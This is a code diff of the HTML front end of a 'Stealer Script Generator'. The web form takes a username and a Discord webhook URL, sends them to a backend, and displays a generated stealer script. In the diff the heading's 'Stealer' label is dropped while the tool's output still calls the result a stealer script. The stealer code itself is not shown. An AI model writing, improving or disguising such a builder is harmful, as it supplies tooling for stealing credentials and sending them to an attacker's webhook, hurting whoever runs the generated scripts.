@@ -80,10 +80,10 @@
 </head>
 <body>
   <div class="container">
-    <h2>⚡ Stealer Script Generator ⚡</h2>
+    <h2>⚡ Script Generator ⚡</h2>
     <input type="text" id="username" placeholder="Enter Username">
     <input type="text" id="webhook" placeholder="Enter Discord Webhook URL">
-    <button onclick="sendData()">Generate</button>
+    <button onclick="sendData()">Generate Script</button>
     <div id="result"></div>
   </div>
 
@@ -93,7 +93,7 @@
       const webhook = document.getElementById("webhook").value;
       const result = document.getElementById("result");
 
-      result.textContent = "⚙️ Processing...";
+      result.textContent = "⚙️ Generating Please wait...";
       const res = await fetch("/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -102,7 +102,7 @@
 
       const data = await res.json();
       if (res.ok) {
-        result.innerHTML = `✅ Your Pastefy link:<br><code>${data.paste_link}</code>`;
+        result.innerHTML = `✅ Stealer Script Generated:<br><code>${data.script}</code>`;
       } else {
         result.textContent = "❌ Error: " + (data.body || data);
       }
